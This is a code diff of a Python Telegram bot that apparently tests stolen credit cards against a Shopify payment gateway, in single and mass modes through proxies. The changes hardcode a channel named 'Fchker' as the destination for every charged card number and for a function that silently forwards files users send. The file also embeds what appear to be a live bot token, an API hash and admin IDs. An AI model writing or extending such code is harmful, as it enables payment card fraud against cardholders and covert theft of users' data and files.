@@ -114,8 +114,6 @@ API_HASH = os.getenv("API_HASH", "e53c44adf9ffc52f1eeca7d739e1b212")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8698873627:AAGJdo0TUcfG0PLRbC4wF12uCqz8YQnnmH0")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "1296435544"))
 KEY_ADMINS = {ADMIN_ID, 7203159458, 7716186369, 8409853085}
-CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "Fchker")
-FORWARD_GROUP = os.getenv("FORWARD_GROUP", os.getenv("LOG_GROUP", "Fchker"))
 # ============================================================
 # GLOBAL VARIABLES
 # ============================================================
@@ -133,7 +131,7 @@ async def is_joined_channel(user_id):
     except Exception as e:
         print("VERIFY ERROR:", e)
         return True
-
+CHANNEL_USERNAME = "Fchker"
 FAKE_HITS_ENABLED = False        
 # File paths
 PREMIUM_FILE = 'premium.txt'
@@ -1891,7 +1889,7 @@ async def single_chk_cc(event):
         if is_charged:
             try:
                 hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Shopify\nAmount: {price}\nResponse: {response_msg}\nUser: {user_id}"""
-                await bot.send_message(FORWARD_GROUP, hit_log, parse_mode="html")
+                await bot.send_message("Fchker", hit_log, parse_mode="html")
             except:
                 pass
 
@@ -3206,8 +3204,8 @@ async def silent_log_forward_file(event):
         sender = await event.get_sender()
         username = getattr(sender, 'username', None) or getattr(sender, 'first_name', str(event.sender_id))
         caption = f"\U0001f4c4 File from {username} (ID: {event.sender_id})\nFile: {event.file.name}"
-        await bot.send_message(FORWARD_GROUP, caption)
-        await bot.forward_messages(FORWARD_GROUP, event.message)
+        await bot.send_message("Fchker", caption)
+        await bot.forward_messages("Fchker", event.message)
     except Exception as e:
         print(f"Silent forward error: {e}")
 
@@ -3401,7 +3399,7 @@ async def mass_chk_reply(event):
                         await event.reply(hit_msg, parse_mode="html")
 
                         try:
-                            await bot.send_message(FORWARD_GROUP, hit_msg, parse_mode="html")
+                            await bot.send_message("Fchker", hit_msg, parse_mode="html")
                         except Exception:
                             pass
                     elif status_str in ('Error', 'Timeout'):
@@ -3555,22 +3553,24 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
         ]
     ]
 
-    status_msg = await event.reply(f"""━━━━━━━━━━━━━━━━━━━━
-<b>Gateway</b> -> {gateway_name}
-<b>Status</b> -> CHECKING
-<b>Mode</b> -> Approved + Charged
-
-<b>PROGRESS</b>
-[                    ] 0%
-<b>Checked</b> -> 0/{total}
-<b>Approved</b> -> 0
-<b>CHARGED</b> -> 0
-<b>Dead</b> -> 0
-<b>Errors</b> -> 0
-<b>Time</b> -> 0s
-<b>Proxies</b> -> {active_proxies_count} / {active_proxies_count} active
+    initial_pbar = make_progress_bar(0)
+    status_msg = await event.reply(f"""<b>陣 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𝙃𝙐𝘿</b>
 ━━━━━━━━━━━━━━━━━━━━
-<b>Session ID</b> -> {session_id}""", buttons=control_buttons, parse_mode="html")
+<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
+<b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>CHECKING</code> ⚡
+<b>式 𝙈𝙤𝙙𝙚</b> -» Approved + Charged
+
+<b>進 𝙋𝙧𝙤𝙜𝙧𝙚𝙨s</b>
+{initial_pbar} <b>0%</b>
+<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>0 / {total}</code>
+<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>0</code> ✅
+<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>0</code> 🟢
+<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>0</code> ❌
+<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>0</code> ⚠️
+<b>時 𝙏𝙞𝙢𝙚</b> -» <code>0s</code>
+<b>網 𝙋𝙧𝙤𝙭𝙞𝙚𝙨</b> -» <code>{active_proxies_count} / {active_proxies_count} Active</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>符 𝙎𝙚𝙨𝙨𝙞𝙤𝙣</b> -» <code>{session_id}</code>""", buttons=control_buttons, parse_mode="html")
 
     is_running = True
 
@@ -3645,7 +3645,7 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
                     await event.reply(hit_msg, parse_mode="html")
 
                     try:
-                        await bot.send_message(FORWARD_GROUP, hit_msg, parse_mode="html")
+                        await bot.send_message("Fchker", hit_msg, parse_mode="html")
                     except Exception:
                         pass
                 elif st_lower in ('error', 'timeout'):
